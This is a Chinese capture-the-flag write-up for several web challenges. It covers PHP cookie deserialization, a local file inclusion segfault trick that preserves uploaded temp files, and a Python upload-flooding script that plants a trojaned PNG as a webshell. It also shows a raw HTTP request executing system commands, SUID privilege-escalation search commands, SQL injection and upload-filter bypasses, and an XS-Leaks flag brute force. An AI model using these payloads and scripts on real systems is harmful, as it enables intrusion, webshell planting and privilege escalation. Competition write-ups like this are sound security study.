    highlight_file("myclass.php");
    echo "";
    highlight_file("function.php");
    qwb) echo file_get_contents($this->qwb);
        }
    }
    ?>
入口的 COOKIE 存在反序列化
去掉最后的大括号，利用反序列化报错来防止进入 Exception
    O:7:"myclass":1:{s:1:"h";O:5:"Hello":1:{s:3:"qwb";s:36:"e2a7106f1cc8bb1e1318df70aa0a3540.php";}
    O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D
`e2a7106f1cc8bb1e1318df70aa0a3540.php`
`bff139fa05ac583f685a523ab3d110a0.php`
     0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            imagepng($second, $file);
            imagedestroy($second);//销毁，清内存
        }
        imagedestroy($first);
    }
    ?>
`45b963397aa40d4a0063e0d85e4fe7a1.php`
/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=passwd&dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp
当前应该是在 /etc 目录下（？
不过没啥用，不能直接读 /flag，或者说 flag 不在根目录
参考 [LFI via SegmentFault](https://www.jianshu.com/p/dfd049924258)
>
>     include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
>  
>
> 可以导致 php 在执行过程中 Segment Fault
>
> 本地文件包含漏洞可以让 php 包含自身从而导致死循环  
>  然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留
魔改他的脚本
    # -*- coding: utf-8 -*-    
    import requests
    import string
    import itertools
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    base_url = "http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com"
    def upload_file_to_include(url, file_content):
        files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
        try:
            response = requests.post(url, files=files)
            print(response)
        except Exception as e:
            print(e)
    def generate_tmp_files():
        with open('miao.png', 'rb') as fin:
            file_content = fin.read()
        phpinfo_url = "%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd" % (
            base_url)
        length = 6
        times = int(len(charset) ** (length / 2))
        for i in range(times):
            print("[+] %d / %d" % (i, times))
            upload_file_to_include(phpinfo_url, file_content)
    def main():
        generate_tmp_files()
    if __name__ == "__main__":
        main()
图片是个长宽相等的 png，里面放木马。
上传过程中就会留下一些文件不会被删除。
一边跑这个脚本，另一边的一堆 /tmp/phpxxxxxx 里就存在我们的 webshell
由于会自动删除，没了就换新的
根目录果然没 flag
然后利用 shell 发现 `/usr/bin` 下面有个文件可以以 root 权限执行命令
    find / -user root -perm -4000 -print 2>/dev/null
    # 或者
    # find / -perm -u=s -type f 2>/dev/null
flag 在 /l1b 下一个绕来绕去的目录里面
或者
    find / -perm 600 -user root
最后执行
    /usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41
    POST /e2a7106f1cc8bb1e1318df70aa0a3540.php?b822f88a-de15-4dc8-923b-1cbeec54bcfc=/tmp/phpi8bEt1&0=system HTTP/1.1
    Host: eci-2zehg7ugvk0ahcsnkehl.cloudeci1.ichunqiu.com
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: UM_distinctid=1769d95cb5b54d-04781d3935eefa-c791039-1fa400-1769d95cb5c669; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1611909425; ctfer=s%3A5%3A%22ctfer%22%3B; __jsluid_h=847d751b863f86e3ed743f9efb5d5c4f
    Connection: close
    Content-Length: 110
    Content-Type: application/x-www-form-urlencoded
    1=/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41
`flag{b101e657-a46a-4791-abcb-5be544fc12bd}`
###  EasyWeb
> 题目来源于某次帮朋友测试项目的渗透过程，非常非常简单，没有新的知识点，已经去掉了很多需要脑洞猜测的部分，不过依然需要进行一些信息收集工作。So~ Be
> Patient~And have funny!
>
> ​ 47.104.136.46  
>  ​ 47.104.137.239  
>  ​ 121.42.242.238
>
> （每 20 分钟重启一次环境）
>
>   1. flag不在数据库；1. 能看到报错信息是预期现象
>
直接访问，根据 html 里的提示访问 `/hint`，得知文件在 `/files/????????????????????????????????`
访问 `/file` 下载得到相应的文件
根据里面的 `hint.txt`，扫描端口得到
    Try to scan 35000-40000 ^_^.
    All tables are empty except for the table where the username and password are located
    Table: employee
sql 注入得到登录信息为 `admin`、`99f609527226e076d668668582ac4420`
扫目录得到 /file 有文件上传
直接上传会被卡
改文件名为 `php.php` 可以绕过
然后文件内容绕过，先用段标签和 `$_GET[1]` 绕过写小马，再通过 `?1=echo '' > x.php` 写马。
蚁剑连上之后发现权限不够，读不了 flag。
查看端口发现有个端口还跑着 jboss。
代理整出来，然后参考
[jboss漏洞getshell](https://blog.csdn.net/weixin_43999372/article/details/88364032)
写 webshell，最后读到 flag。
_（比赛结束之后环境关了也就么得图了_
`flag{V3ry_v3rY_E3si_a_w3B_Ch[@1l3ng3](https://github.com/1l3ng3 "@1l3ng3")}`
###  EasyXSS
> The BOT starts every five seconds and handles only one reported URL at a
> time. The BOT is Google-Chrome 91.0.4472.77 (Official Build) (64-bit)
>
> Notice: the address requested by the BOT is .
>
> Each time the BOT processes a request, it clears subsequent report URLs from
> the database
>
> 每 15 分钟重启环境
>
> 47.104.192.54:8888  
>  47.104.210.56:8888  
>  47.104.155.242:8888
>
> Hint: flag格式是flag{uuid}
算是个 [XS-Leaks](https://xsleaks.com/) 的题目，算是侧信道的一种吧。
通过 `/hint` 路由可以知道 flag 判断逻辑。
    app.all("/flag", auth, async (req, res, next) => {
        if (req.session.isadmin && typeof req.query.var === "string") {
            fs.readFile("/flag", "utf8", (err, flag) => {
                let flagArray = flag.split("");
                let dataArray = req.query.var.split("");
                let check = true;
                for (let i = 0; i < dataArray.length && i < flagArray.length; i++) {
                    if (dataArray[i] !== flagArray[i]) {
                        check = false;
                        break;
                    }
                }
                if (check) {
                    res.status(200).send(req.query.var);
                } else {
                    res.status(500).send("Keyword Error!");
                }
            });
        } else {
            res.status(500).send("Sorry, you are not admin!");
        }
    });
`/flag` 路由对输入的逐个字符与 flag 的这么多个（输入的）长度的字符进行比较，如果每一位都相同则返回 200，否则返回 500.
访问 `/about?theme=xxxxx` 发现存在 XSS。不过过滤了一些东西，比如 空格可以用 `%09` 绕过之类。
根据提示 flag 是个 UUID，于是可以按照这个格式逐位爆破，通过返回的状态来判断当前字符是否正确。